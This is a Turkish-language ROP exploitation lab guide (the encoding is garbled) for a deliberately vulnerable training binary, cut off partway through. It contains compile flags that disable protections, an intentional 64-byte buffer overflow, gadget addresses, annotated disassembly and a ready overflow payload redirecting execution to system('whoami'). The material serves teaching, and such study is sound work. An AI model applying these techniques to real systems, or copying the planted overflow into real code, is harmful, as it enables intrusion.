# CyberLabs: ROP (Return-Oriented Programming) Zafiyeti LaboratuvarÄ±

**ModÃ¼l Kodu:** CL-MEM-005

**Seviye:** Ä°leri

**Konu:** Modern Exploit Teknikleri ve Koruma Bypass

## LaboratuvarÄ±n AmacÄ±

Bu laboratuvar, CyberLabs eÄŸitim platformu iÃ§in hazÄ±rlanmÄ±ÅŸ olup, modern exploit tekniklerinden biri olan **Return-Oriented Programming (ROP)** konusunu ele almaktadÄ±r. KatÄ±lÄ±mcÄ±larÄ±n bu laboratuvar sonunda aÅŸaÄŸÄ±daki yetkinlikleri kazanmasÄ± hedeflenmektedir:

- ROP tekniÄŸinin temel prensiplerini ve NX bit korumasÄ±nÄ± nasÄ±l aÅŸtÄ±ÄŸÄ±nÄ± anlamak.
- Mevcut kod parÃ§alarÄ±nÄ± (gadget'larÄ±) kullanarak program akÄ±ÅŸÄ±nÄ± kontrol etmeyi Ã¶ÄŸrenmek.
- `objdump`, `gdb` ve `ROPgadget` gibi araÃ§larla gadget analizi yapmak.
- GerÃ§ek bir ROP chain oluÅŸturarak program akÄ±ÅŸÄ±nÄ± ele geÃ§irmeyi pratik olarak gÃ¶rmek.
- Modern koruma mekanizmalarÄ±nÄ± (NX, ASLR, Stack Canary) aÅŸma tekniklerini Ã¶ÄŸrenmek.

## Zorluk Seviyeleri

## ğŸŸ¢ **KOLAY YOL: Debug Sembolleri ile**
```bash
# test_lab.sh dosyasÄ±nda -g flag'ini ekleyin
g++ -m64 -fno-stack-protector -z execstack -no-pie -g -Wno-unused-result -Wno-stringop-overflow -o compiled/vulnerable_code source_code/vulnerable_code.cpp
```
- Debug sembolleri ile daha kolay analiz
- GDB'de `p &variable` komutlarÄ± Ã§alÄ±ÅŸÄ±r
- EÄŸitim amaÃ§lÄ± ideal

## ğŸ”´ **ZOR YOL: Debug Sembolleri Olmadan (VarsayÄ±lan)**
```bash
# Mevcut derleme (debug sembolleri yok)
g++ -m64 -fno-stack-protector -z execstack -no-pie -Wno-unused-result -Wno-stringop-overflow -o compiled/vulnerable_code source_code/vulnerable_code.cpp
```
- GerÃ§ek dÃ¼nyaya daha yakÄ±n
- `info functions`, `disassemble` komutlarÄ± gerekir
- Production binary'lerde debug sembolleri yoktur

## ROP (Return-Oriented Programming) Nedir?

**Return-Oriented Programming (ROP)**, modern iÅŸletim sistemlerindeki **NX bit** (No-Execute) korumasÄ±nÄ± aÅŸmak iÃ§in geliÅŸtirilmiÅŸ bir exploit tekniÄŸidir. Bu teknik, saldÄ±rganÄ±n kendi shellcode'unu Ã§alÄ±ÅŸtÄ±rmasÄ± yerine, programda zaten mevcut olan kod parÃ§alarÄ±nÄ± (gadget'larÄ±) kullanarak program akÄ±ÅŸÄ±nÄ± kontrol etmesini saÄŸlar.

### ROP'un Temel Prensipleri:

1. **Gadget Bulma:** Programda `ret` komutu ile biten kÃ¼Ã§Ã¼k kod parÃ§alarÄ±nÄ± bulma
2. **Chain OluÅŸturma:** Bu gadget'larÄ± sÄ±ralÄ± olarak birleÅŸtirerek istenen iÅŸlevi gerÃ§ekleÅŸtirme
3. **Stack Manipulation:** Stack'i kullanarak gadget'lar arasÄ±nda veri aktarÄ±mÄ± yapma
4. **Return Address Overwrite:** Buffer overflow ile return address'i ilk gadget'Ä±n adresi ile deÄŸiÅŸtirme

### ROP AvantajlarÄ±:
- NX bit korumasÄ±nÄ± aÅŸar
- ASLR'Ä± aÅŸabilir (information leak ile)
- Stack Canary'yi aÅŸabilir
- GerÃ§ek kod kullanÄ±r, antivirus tarafÄ±ndan tespit edilmesi zor

## Disclaimer / Yasal UyarÄ±

Bu laboratuvar iÃ§eriÄŸi, tamamen **CyberLabs eÄŸitim ortamÄ±** iÃ§in tasarlanmÄ±ÅŸtÄ±r. Buradaki bilgi ve kodlarÄ±n amacÄ±, siber gÃ¼venlik uzmanlarÄ±nÄ±n savunma mekanizmalarÄ±nÄ± daha iyi anlamalarÄ±na ve zafiyet analizi yeteneklerini geliÅŸtirmelerine yardÄ±mcÄ± olmaktÄ±r.

### Yasak KullanÄ±mlar
- CyberLabs eÄŸitim ortamÄ± dÄ±ÅŸÄ±nda kullanÄ±m
- Yasa dÄ±ÅŸÄ± faaliyetler veya yetkisiz sistem eriÅŸimi
- GerÃ§ek sistemlerin kÃ¶tÃ¼ niyetli sÃ¶mÃ¼rÃ¼lmesi
- EÄŸitim dÄ±ÅŸÄ± amaÃ§larla daÄŸÄ±tÄ±m

### Sorumluluk
Bu materyallerin CyberLabs ortamÄ± dÄ±ÅŸÄ±nda veya yasa dÄ±ÅŸÄ± amaÃ§larla kullanÄ±lmasÄ± kesinlikle yasaktÄ±r ve tÃ¼m sorumluluk kullanÄ±cÄ±ya aittir. Yazarlar ve CyberLabs, bu eÄŸitim materyallerinin kÃ¶tÃ¼ye kullanÄ±mÄ±ndan sorumlu deÄŸildir.

## Senaryo

Laboratuvar senaryosu, iki ana bileÅŸenden oluÅŸmaktadÄ±r:

1. **`vulnerable_code.cpp`:** Ä°Ã§erisinde kasÄ±tlÄ± olarak bir buffer overflow zafiyeti barÄ±ndÄ±ran, C++ ile yazÄ±lmÄ±ÅŸ hedef uygulama. NX bit korumasÄ± aktif olmasÄ±na raÄŸmen ROP ile sÃ¶mÃ¼rÃ¼lebilir.

2. **`exploit.py`:** Zafiyetli uygulamadaki aÃ§Ä±ÄŸÄ± kullanarak ROP chain oluÅŸturan ve program akÄ±ÅŸÄ±nÄ± ele geÃ§iren Python exploit script'i.

## Platform UyumluluÄŸu

Bu lab hem **Linux (x86_64)** hem de **macOS (ARM64)** platformlarÄ±nda Ã§alÄ±ÅŸÄ±r:

### ğŸ§ **Linux x86_64**
- GerÃ§ek ROP chain kullanÄ±r
- x86_64 assembly gadget'larÄ±
- NX bit bypass teknikleri
- Production benzeri ortam

### ğŸ **macOS ARM64**
- EÄŸitim amaÃ§lÄ± basit ROP chain
- ARM64 mimarisi farklÄ±lÄ±klarÄ±
- Platform-specific optimizasyonlar
- GeliÅŸtirme ortamÄ±

## Kurulum ve Ã‡alÄ±ÅŸtÄ±rma AdÄ±mlarÄ±

### 1. Zafiyetli Kodu Derleme

```bash
# Otomatik derleme (platform detection ile)
./compile_linux.sh

# Linux iÃ§in manuel derleme
g++ -m64 -fno-stack-protector -z execstack -no-pie -Wno-unused-result -Wno-stringop-overflow -o compiled/vulnerable_code source_code/vulnerable_code.cpp

# macOS iÃ§in manuel derleme
g++ -m64 -fno-stack-protector -no-pie -Wno-unused-result -Wno-shift-overflow -o compiled/vulnerable_code source_code/vulnerable_code.cpp
```

**Derleme BayraklarÄ± AÃ§Ä±klamasÄ±:**
- `-m64`: 64-bit derleme
- `-fno-stack-protector`: Stack canary korumasÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rak
- `-z execstack`: Stack'i executable yap (bazÄ± ROP teknikleri iÃ§in)
- `-no-pie`: Position Independent Executable'Ä± devre dÄ±ÅŸÄ± bÄ±rak
- `-Wno-unused-result`: KullanÄ±lmayan sonuÃ§ uyarÄ±larÄ±nÄ± bastÄ±r
- `-Wno-stringop-overflow`: String overflow uyarÄ±larÄ±nÄ± bastÄ±r

### 2. ROP Gadget'larÄ±nÄ± Analiz Etme

```bash
# Objdump ile gadget'larÄ± bulma
objdump -d compiled/vulnerable_code | grep -E "(pop rdi|pop rsi|pop rdx|syscall)"

# ROPgadget aracÄ± ile (eÄŸer yÃ¼klÃ¼yse)
ROPgadget --binary compiled/vulnerable_code --ropchain
```

### 3. GDB ile Dinamik Analiz

```bash
gdb ./compiled/vulnerable_code
(gdb) info functions
(gdb) disassemble win_function
(gdb) disassemble gadget_pop_rdi
(gdb) break vulnerable_function
(gdb) run
```

### 4. Exploit Ã‡alÄ±ÅŸtÄ±rma

```bash
# Otomatik test
./test_lab.sh

# Manuel exploit
python3 source_code/exploit.py
```

## ROP Chain YapÄ±sÄ±

Bu laboratuvarda kullanÄ±lan ROP chain yapÄ±sÄ±:

### ğŸ§ **Linux x86_64:**
```
Buffer Overflow (64 bytes) + 
Return Address Overwrite (8 bytes) +
ROP Chain:
â”œâ”€â”€ pop rdi; ret (gadget)
â”œâ”€â”€ 0x0 (rdi deÄŸeri)
â”œâ”€â”€ pop rsi; ret (gadget)  
â”œâ”€â”€ 0x0 (rsi deÄŸeri)
â”œâ”€â”€ pop rdx; ret (gadget)
â”œâ”€â”€ 0x0 (rdx deÄŸeri)
â”œâ”€â”€ syscall; ret (gadget)
â””â”€â”€ execute_whoami (shellcode enjeksiyonu)
```

### ğŸ **macOS ARM64:**
```
Buffer Overflow (64 bytes) + 
Return Address Overwrite (8 bytes) +
ROP Chain:
â””â”€â”€ execute_whoami (basit komut enjeksiyonu)
```

### ğŸ’» **Shellcode Enjeksiyonu:**
- **Linux:** GerÃ§ek ROP chain ile `system("whoami")` Ã§aÄŸrÄ±sÄ±
- **macOS:** Basit fonksiyon Ã§aÄŸrÄ±sÄ± ile `system("whoami")` Ã§alÄ±ÅŸtÄ±rma
- **Hedef:** Sistem komutlarÄ±nÄ± ROP ile Ã§alÄ±ÅŸtÄ±rma

## Ã–ÄŸrenme Hedefleri

### Temel Seviye:
- ROP tekniÄŸinin ne olduÄŸunu anlama
- Gadget kavramÄ±nÄ± Ã¶ÄŸrenme
- Basit ROP chain oluÅŸturma

### Orta Seviye:
- NX bit korumasÄ±nÄ± aÅŸma
- Stack manipulation teknikleri
- Register deÄŸerlerini kontrol etme

### Ä°leri Seviye:
- KarmaÅŸÄ±k ROP chain'leri
- ASLR bypass teknikleri
- Real-world ROP exploit'leri

## Gerekli AraÃ§lar

- **GDB:** Dinamik analiz ve debugging
- **objdump:** Statik analiz ve gadget bulma
- **ROPgadget:** Otomatik gadget analizi (opsiyonel)
- **pwntools:** Python exploit geliÅŸtirme
- **hexdump:** Binary veri analizi

## Troubleshooting

### YaygÄ±n Sorunlar:

1. **"Permission denied" hatasÄ±:**
   ```bash
   chmod +x compiled/vulnerable_code
   ```

2. **"Address not found" hatasÄ±:**
   - GDB ile adresleri manuel bulun
   - `info functions` komutunu kullanÄ±n

3. **"ROP chain failed" hatasÄ±:**
   - Gadget adreslerini kontrol edin
   - Stack alignment'Ä± kontrol edin

## Tam Ã‡Ã¶zÃ¼m (GDB ile Adres Bulma)

### 1. GDB ile Adres Bulma

```bash
# Binary'yi GDB ile aÃ§
gdb ./compiled/vulnerable_code

# Fonksiyon adreslerini bul
(gdb) info functions
(gdb) info functions win_function
(gdb) info functions execute_whoami
(gdb) info functions gadget_pop_rdi
(gdb) info functions gadget_pop_rsi
(gdb) info functions gadget_pop_rdx
(gdb) info functions gadget_syscall

# GerÃ§ek adresler (Linux x86_64):
# win_function: 0x401166
# execute_whoami: 0x401220
# gadget_pop_rdi: 0x401323
# gadget_pop_rsi: 0x40133a
# gadget_pop_rdx: 0x401351
# gadget_syscall: 0x401368

# ROPgadget ile bulunan gerÃ§ek gadget'lar:
# pop rdi; ret: 0x401383
# pop rsi; ret: 0x40138c
# pop rdx; ret: 0x401395
# syscall: 0x40139e

# Disassembly ile gadget'larÄ± incele
(gdb) disassemble win_function
(gdb) disassemble execute_whoami
(gdb) disassemble gadget_pop_rdi
(gdb) disassemble gadget_pop_rsi
(gdb) disassemble gadget_pop_rdx
(gdb) disassemble gadget_syscall

# GerÃ§ek Assembly KodlarÄ± (Linux x86_64) - DetaylÄ± Analiz:

# ========================================
# win_function (0x401166) - DetaylÄ± Ä°nceleme
# ========================================
# 0x401166: push %rbp
# AÃ‡IKLAMA: RBP register'Ä±nÄ± stack'e kaydet (stack frame baÅŸlangÄ±cÄ±)
# NEDEN Ã–NEMLÄ°: Fonksiyon baÅŸlangÄ±cÄ±nda stack frame oluÅŸturur

# 0x401167: mov %rsp,%rbp  
# AÃ‡IKLAMA: RSP'yi RBP'ye kopyala (stack frame pointer)
# NEDEN Ã–NEMLÄ°: Yerel deÄŸiÅŸkenlere eriÅŸim iÃ§in referans noktasÄ±

# 0x40116a: lea 0xe97(%rip),%rax        # 0x402008
# AÃ‡IKLAMA: RIP + 0xe97 adresini RAX'e yÃ¼kle (string adresi)
# NEDEN Ã–NEMLÄ°: "ROP Vulnerability Lab Basarili!" string'ini iÅŸaret eder
# RIP = 0x40116a + 0xe97 = 0x402008

# 0x401171: mov %rax,%rsi
# AÃ‡IKLAMA: RAX'i RSI'ya kopyala (2. parametre)
# NEDEN Ã–NEMLÄ°: std::cout'a string parametresi geÃ§er

# 0x401174: lea 0x2ec5(%rip),%rax        # 0x404040 <_ZSt4cout@GLIBCXX_3.4>
# AÃ‡IKLAMA: RIP + 0x2ec5 adresini RAX'e yÃ¼kle (cout objesi)
# NEDEN Ã–NEMLÄ°: std::cout objesinin adresini alÄ±r
# RIP = 0x401174 + 0x2ec5 = 0x404040

# 0x40117b: mov %rax,%rdi
# AÃ‡IKLAMA: RAX'i RDI'ya kopyala (1. parametre)
# NEDEN Ã–NEMLÄ°: std::cout << string iÃ§in 1. parametre

# 0x40117e: call 0x401040 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
# AÃ‡IKLAMA: std::cout << string operatÃ¶rÃ¼nÃ¼ Ã§aÄŸÄ±r
# NEDEN Ã–NEMLÄ°: String'i ekrana yazdÄ±rÄ±r

# 0x401216: mov $0x0,%edi
# AÃ‡IKLAMA: RDI'ya 0 deÄŸerini yÃ¼kle (exit kodu)
# NEDEN Ã–NEMLÄ°: exit(0) iÃ§in parametre hazÄ±rlar

# 0x40121b: call 0x401060 <exit@plt>
# AÃ‡IKLAMA: exit(0) fonksiyonunu Ã§aÄŸÄ±r
# NEDEN Ã–NEMLÄ°: ProgramÄ± 0 kodu ile sonlandÄ±rÄ±r

# ========================================
# execute_whoami (0x401220) - DetaylÄ± Ä°nceleme  
# ========================================
# 0x401220: push %rbp
# AÃ‡IKLAMA: RBP register'Ä±nÄ± stack'e kaydet
# NEDEN Ã–NEMLÄ°: Stack frame baÅŸlangÄ±cÄ±

# 0x401221: mov %rsp,%rbp
# AÃ‡IKLAMA: RSP'yi RBP'ye kopyala
# NEDEN Ã–NEMLÄ°: Yerel deÄŸiÅŸkenler iÃ§in referans

# 0x401224: sub $0x10,%rsp
# AÃ‡IKLAMA: Stack'ten 16 byte yer ayÄ±r (yerel deÄŸiÅŸkenler iÃ§in)
# NEDEN Ã–NEMLÄ°: Yerel deÄŸiÅŸkenler iÃ§in stack alanÄ±

# 0x401228: lea 0xe89(%rip),%rax        # 0x4020b8
# AÃ‡IKLAMA: "Shellcode Enjeksiyonu Basarili!" string adresini al
# NEDEN Ã–NEMLÄ°: Ä°lk mesajÄ± yazdÄ±rmak iÃ§in
# RIP = 0x401228 + 0xe89 = 0x4020b8

# 0x40122f: mov %rax,%rsi
# AÃ‡IKLAMA: String adresini RSI'ya kopyala (2. parametre)
# NEDEN Ã–NEMLÄ°: std::cout'a string parametresi

# 0x401232: lea 0x2e07(%rip),%rax        # 0x404040 <_ZSt4cout@GLIBCXX_3.4>
# AÃ‡IKLAMA: std::cout objesinin adresini al
# NEDEN Ã–NEMLÄ°: std::cout operatÃ¶rÃ¼ iÃ§in

# 0x401239: mov %rax,%rdi
# AÃ‡IKLAMA: cout objesini RDI'ya kopyala (1. parametre)
# NEDEN Ã–NEMLÄ°: std::cout << string iÃ§in 1. parametre

# 0x40123c: call 0x401040 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
# AÃ‡IKLAMA: std::cout << string operatÃ¶rÃ¼nÃ¼ Ã§aÄŸÄ±r
# NEDEN Ã–NEMLÄ°: Ä°lk mesajÄ± ekrana yazdÄ±rÄ±r

# 0x40127e: lea 0xe7d(%rip),%rax        # 0x402102
# AÃ‡IKLAMA: "whoami" string adresini al
# NEDEN Ã–NEMLÄ°: system("whoami") iÃ§in parametre
# RIP = 0x40127e + 0xe7d = 0x402102

# 0x401285: mov %rax,%rdi
# AÃ‡IKLAMA: "whoami" string'ini RDI'ya kopyala (1. parametre)
# NEDEN Ã–NEMLÄ°: system() fonksiyonuna parametre

# 0x401288: call 0x401030 <system@plt>
# AÃ‡IKLAMA: system("whoami") fonksiyonunu Ã§aÄŸÄ±r
# NEDEN Ã–NEMLÄ°: â­ ANA HEDEF! whoami komutunu Ã§alÄ±ÅŸtÄ±rÄ±r

# 0x401319: mov $0x0,%edi
# AÃ‡IKLAMA: RDI'ya 0 deÄŸerini yÃ¼kle (exit kodu)
# NEDEN Ã–NEMLÄ°: exit(0) iÃ§in parametre

# 0x40131e: call 0x401060 <exit@plt>
# AÃ‡IKLAMA: exit(0) fonksiyonunu Ã§aÄŸÄ±r
# NEDEN Ã–NEMLÄ°: ProgramÄ± dÃ¼zgÃ¼n sonlandÄ±rÄ±r

# ========================================
# gadget_pop_rdi (0x401323) - Dummy Fonksiyon
# ========================================
# 0x401323: push %rbp
# AÃ‡IKLAMA: RBP'yi stack'e kaydet
# NEDEN Ã–NEMLÄ°: Fonksiyon baÅŸlangÄ±cÄ±

# 0x401324: mov %rsp,%rbp
# AÃ‡IKLAMA: Stack frame pointer oluÅŸtur
# NEDEN Ã–NEMLÄ°: Yerel deÄŸiÅŸkenler iÃ§in

# 0x401327: movl $0x0,-0x4(%rbp)
# AÃ‡IKLAMA: Yerel deÄŸiÅŸkene 0 deÄŸeri yaz
# NEDEN Ã–NEMLÄ°: Sadece dummy iÅŸlem

# 0x40132e: mov -0x4(%rbp),%eax
# AÃ‡IKLAMA: Yerel deÄŸiÅŸkeni EAX'e oku
# NEDEN Ã–NEMLÄ°: Sadece dummy iÅŸlem

# 0x401331: add $0x1,%eax
# AÃ‡IKLAMA: EAX'e 1 ekle
# NEDEN Ã–NEMLÄ°: Sadece dummy iÅŸlem

# 0x401334: mov %eax,-0x4(%rbp)
# AÃ‡IKLAMA: EAX'i yerel deÄŸiÅŸkene yaz
# NEDEN Ã–NEMLÄ°: Sadece dummy iÅŸlem

# 0x401337: nop
# AÃ‡IKLAMA: HiÃ§bir ÅŸey yapma (no operation)
# NEDEN Ã–NEMLÄ°: Sadece dummy iÅŸlem

# 0x401338: pop %rbp
# AÃ‡IKLAMA: RBP'yi stack'ten geri yÃ¼kle
# NEDEN Ã–NEMLÄ°: Stack frame temizliÄŸi

# 0x401339: ret
# AÃ‡IKLAMA: Fonksiyondan dÃ¶n
# NEDEN Ã–NEMLÄ°: âš ï¸ Sadece ret var, pop rdi yok!

# ========================================
# GerÃ§ek ROP Gadget'larÄ± (ROPgadget ile bulunan)
# ========================================
# pop rdi; ret (0x401383):
# 0x401383: pop %rdi
# AÃ‡IKLAMA: Stack'ten deÄŸer alÄ±p RDI'ya yÃ¼kle
# NEDEN Ã–NEMLÄ°: â­ GERÃ‡EK GADGET! 1. parametre iÃ§in

# 0x401384: ret
# AÃ‡IKLAMA: Fonksiyondan dÃ¶n
# NEDEN Ã–NEMLÄ°: ROP chain'de bir sonraki gadget'a geÃ§

# pop rsi; ret (0x40138c):
# 0x40138c: pop %rsi
# AÃ‡IKLAMA: Stack'ten deÄŸer alÄ±p RSI'ya yÃ¼kle
# NEDEN Ã–NEMLÄ°: â­ GERÃ‡EK GADGET! 2. parametre iÃ§in

# 0x40138d: ret
# AÃ‡IKLAMA: Fonksiyondan dÃ¶n
# NEDEN Ã–NEMLÄ°: ROP chain'de devam

# pop rdx; ret (0x401395):
# 0x401395: pop %rdx
# AÃ‡IKLAMA: Stack'ten deÄŸer alÄ±p RDX'ya yÃ¼kle
# NEDEN Ã–NEMLÄ°: â­ GERÃ‡EK GADGET! 3. parametre iÃ§in

# 0x401396: ret
# AÃ‡IKLAMA: Fonksiyondan dÃ¶n
# NEDEN Ã–NEMLÄ°: ROP chain'de devam

# syscall (0x40139e):
# 0x40139e: syscall
# AÃ‡IKLAMA: Sistem Ã§aÄŸrÄ±sÄ± yap
# NEDEN Ã–NEMLÄ°: â­ GERÃ‡EK SYSCALL! DoÄŸrudan kernel Ã§aÄŸrÄ±sÄ±

# ========================================
# ZAFÄ°YET ANALÄ°ZÄ° - Buffer Overflow DetaylarÄ±
# ========================================

# vulnerable_function (0x4013a4) - ZAFÄ°YETÄ°N KAYNAÄI:
# 0x4013a4: push %rbp
# AÃ‡IKLAMA: Stack frame baÅŸlangÄ±cÄ±
# ZAFÄ°YET: Bu noktada stack dÃ¼zeni oluÅŸur

# 0x4013a5: mov %rsp,%rbp
# AÃ‡IKLAMA: Stack frame pointer oluÅŸtur
# ZAFÄ°YET: RBP stack'in baÅŸlangÄ±Ã§ noktasÄ±nÄ± iÅŸaret eder

# 0x4013a8: sub $0x40,%rsp
# AÃ‡IKLAMA: Stack'ten 64 byte yer ayÄ±r (buffer iÃ§in)
# ZAFÄ°YET: âš ï¸ SADECE 64 BYTE! Ama 256 byte okuyacak
# STACK LAYOUT:
# +------------------+ <- $rsp + 0x48 (72 bytes) - RETURN ADDRESS
# | 0x0000000000401471| <- Bu deÄŸer deÄŸiÅŸtirilecek
# +------------------+ <- $rsp + 0x40 (64 bytes) - SAVED RBP  
# | 0x0000000000000000| <- Bu deÄŸer korunacak
# +------------------+ <- $rsp + 0x8 (0-63 bytes) - BUFFER[64]
# | 0x0000000000000000| <- Buraya 72 byte yazÄ±lacak
# | 0x0000000000000000| <- Buffer devam ediyor...
# | 0x0000000000000000| <- ...64 byte'a kadar
# +------------------+ <- $rsp + 0x0 - FUNCTION ARGS
# | 0x0000000000000000| <- Function arguments

# 0x4013ac: lea 0xe55(%rip),%rax        # 0x402208
# AÃ‡IKLAMA: "Giris yapin: " string adresini al
# ZAFÄ°YET: Bu string prompt'u yazdÄ±rÄ±r

# 0x4013b3: mov %rax,%rsi
# AÃ‡IKLAMA: String adresini RSI'ya kopyala (2. parametre)
# ZAFÄ°YET: std::cout'a parametre geÃ§er

# 0x4013b6: lea 0x2a83(%rip),%rax        # 0x404040 <_ZSt4cout@GLIBCXX_3.4>
# AÃ‡IKLAMA: std::cout objesinin adresini al
# ZAFÄ°YET: std::cout operatÃ¶rÃ¼ iÃ§in

# 0x4013bd: mov %rax,%rdi
# AÃ‡IKLAMA: cout objesini RDI'ya kopyala (1. parametre)
# ZAFÄ°YET: std::cout << string iÃ§in 1. parametre

# 0x4013c0: call 0x401040 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
# AÃ‡IKLAMA: std::cout << "Giris yapin: " Ã§aÄŸrÄ±sÄ±
# ZAFÄ°YET: Prompt'u ekrana yazdÄ±rÄ±r

# 0x4013c5: lea -0x40(%rbp),%rax
# AÃ‡IKLAMA: Buffer'Ä±n adresini al ($rbp - 0x40)
# ZAFÄ°YET: âš ï¸ BUFFER ADRESÄ°! 64 byte'lÄ±k buffer'Ä±n baÅŸlangÄ±cÄ±
# BUFFER ADRESÄ° = $rbp - 0x40 = $rsp + 0x8

# 0x4013c9: mov %rax,%rdi
# AÃ‡IKLAMA: Buffer adresini RDI'ya kopyala (1. parametre)
# ZAFÄ°YET: read() fonksiyonuna buffer parametresi

# 0x4013cc: mov $0x100,%esi
# AÃ‡IKLAMA: RSI'ya 256 deÄŸerini yÃ¼kle (okunacak byte sayÄ±sÄ±)
# ZAFÄ°YET: âš ï¸ 256 BYTE OKUYACAK! Ama buffer sadece 64 byte

# 0x4013d1: call 0x401070 <read@plt>
# AÃ‡IKLAMA: read(0, buffer, 256) Ã§aÄŸrÄ±sÄ±
# ZAFÄ°YET: â­ ANA ZAFÄ°YET! 256 byte okuyup 64 byte buffer'a yazÄ±yor
# BU ZAFÄ°YET NEDENÄ°YLE:
# - 64 byte buffer + 8 byte saved RBP = 72 byte
# - 72 byte'dan sonraki 8 byte = RETURN ADDRESS
# - 256 byte okursa, return address'i deÄŸiÅŸtirebilir

# 0x4013d6: lea -0x40(%rbp),%rax
# AÃ‡IKLAMA: Buffer adresini tekrar al
# ZAFÄ°YET: Buffer iÃ§eriÄŸini yazdÄ±rmak iÃ§in

# 0x4013da: mov %rax,%rsi
# AÃ‡IKLAMA: Buffer adresini RSI'ya kopyala (2. parametre)
# ZAFÄ°YET: std::cout'a buffer parametresi

# 0x4013dd: lea 0x2a5c(%rip),%rax        # 0x404040 <_ZSt4cout@GLIBCXX_3.4>
# AÃ‡IKLAMA: std::cout objesinin adresini al
# ZAFÄ°YET: std::cout operatÃ¶rÃ¼ iÃ§in

# 0x4013e4: mov %rax,%rdi
# AÃ‡IKLAMA: cout objesini RDI'ya kopyala (1. parametre)
# ZAFÄ°YET: std::cout << buffer iÃ§in 1. parametre

# 0x4013e7: call 0x401040 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
# AÃ‡IKLAMA: std::cout << buffer Ã§aÄŸrÄ±sÄ±
# ZAFÄ°YET: Buffer iÃ§eriÄŸini ekrana yazdÄ±rÄ±r

# 0x4013ec: nop
# AÃ‡IKLAMA: HiÃ§bir ÅŸey yapma
# ZAFÄ°YET: Fonksiyon sonu

# 0x4013ed: leave
# AÃ‡IKLAMA: Stack frame'i temizle (mov %rbp,%rsp; pop %rbp)
# ZAFÄ°YET: âš ï¸ BU NOKTA ZAFÄ°YET! Return address'i okuyacak
# EÄŸer buffer overflow varsa, yanlÄ±ÅŸ return address'e dÃ¶necek

# 0x4013ee: ret
# AÃ‡IKLAMA: Return address'e dÃ¶n
# ZAFÄ°YET: â­ ZAFÄ°YET TETÄ°KLENÄ°R! DeÄŸiÅŸtirilmiÅŸ return address'e dÃ¶ner

# ========================================
# ZAFÄ°YETÄ°N TETÄ°KLENME SÃœRECÄ°
# ========================================

# 1. ADIM: Normal Ã‡alÄ±ÅŸma
# - Buffer: 64 byte (0x4013a8: sub $0x40,%rsp)
# - Read: 256 byte (0x4013cc: mov $0x100,%esi)
# - ZAFÄ°YET: 256 > 64, buffer overflow!

# 2. ADIM: Stack Corruption
# - 0-63 byte: Buffer iÃ§eriÄŸi
# - 64-71 byte: Saved RBP (8 byte)
# - 72-79 byte: RETURN ADDRESS (8 byte) âš ï¸
# - 80+ byte: Stack'in geri kalanÄ±

# 3. ADIM: Return Address DeÄŸiÅŸimi
# - Normal: 0x401471 (main'den dÃ¶nÃ¼ÅŸ)
# - Exploit: 0x401220 (execute_whoami)
# - SonuÃ§: Program execute_whoami'ye yÃ¶nlendirilir

# 4. ADIM: ROP Chain Ã‡alÄ±ÅŸmasÄ±
# - execute_whoami Ã§aÄŸrÄ±lÄ±r
# - system("whoami") Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r
# - Program exit(0) ile sonlanÄ±r

# ========================================
# ZAFÄ°YETÄ°N KODDAKÄ° KONUMU
# ========================================

# vulnerable_code.cpp'deki zafiyetli kod:
# void vulnerable_function() {
#     char buffer[64];  // â† 64 byte buffer
#     std::cout << "Giris yapin: " << std::endl;
#     read(0, buffer, 256);  // â† 256 byte okuyor! ZAFÄ°YET!
#     std::cout << "Buffer icerigi: " << buffer << std::endl;
# }

# Assembly'deki karÅŸÄ±lÄ±ÄŸÄ±:
# 0x4013a8: sub $0x40,%rsp        // 64 byte buffer
# 0x4013cc: mov $0x100,%esi       // 256 byte okuyacak
# 0x4013d1: call 0x401070 <read@plt>  // read(0, buffer, 256)

# Buffer overflow'u test et
(gdb) break vulnerable_function
(gdb) run
(gdb) x/32gx $rsp
(gdb) continue

# DetaylÄ± dinamik analiz
(gdb) break vulnerable_function
(gdb) run
(gdb) info registers
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp
(gdb) x/32gx $rsp-0x50
(gdb) disassemble vulnerable_function
(gdb) stepi
(gdb) x/32gx $rsp
(gdb) continue
```

### 2. GDB ile DetaylÄ± Dinamik Analiz

#### 2.1. Temel Analiz
```bash
# Binary'yi GDB ile aÃ§
gdb ./compiled/vulnerable_code

# ProgramÄ± Ã§alÄ±ÅŸtÄ±r ve breakpoint koy
(gdb) break vulnerable_function
(gdb) run

# Register'larÄ± incele
(gdb) info registers
(gdb) info all-registers

# Stack durumunu incele
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp
(gdb) x/32gx $rsp-0x50
```

#### 2.2. Buffer Overflow Analizi
```bash
# vulnerable_function'da breakpoint
(gdb) break vulnerable_function
(gdb) run

# Stack layout'Ä±nÄ± incele
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp
(gdb) x/32gx $rsp+0x40

# Buffer'Ä±n adresini bul
(gdb) disassemble vulnerable_function
(gdb) x/32gx $rsp+0x8

# Return address'i bul
(gdb) x/gx $rsp+0x48
(gdb) x/gx $rbp+0x8
```

#### 2.3. ROP Chain Testi
```bash
# Payload ile test
(gdb) run
# Payload'Ä± manuel olarak gir:
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x20\x12\x40\x00\x00\x00\x00\x00

# Stack'i incele
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp

# Return address'in deÄŸiÅŸip deÄŸiÅŸmediÄŸini kontrol et
(gdb) x/gx $rsp+0x48
(gdb) x/gx $rbp+0x8
```

#### 2.4. Gadget Analizi
```bash
# Gadget'larÄ± tek tek test et
(gdb) break gadget_pop_rdi
(gdb) run
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) info registers

# execute_whoami fonksiyonunu test et
(gdb) break execute_whoami
(gdb) run
(gdb) x/32gx $rsp
(gdb) stepi
(gdb) continue
```

#### 2.5. Memory Layout Analizi
```bash
# Memory mapping'i incele
(gdb) info proc mappings
(gdb) info files
(gdb) info target

# Stack ve heap durumunu incele
(gdb) x/32gx $rsp
(gdb) x/32gx $rbp
(gdb) x/32gx $rsp-0x100
```

#### 2.6. GeliÅŸmiÅŸ GDB Teknikleri
```bash
# Conditional breakpoint'ler
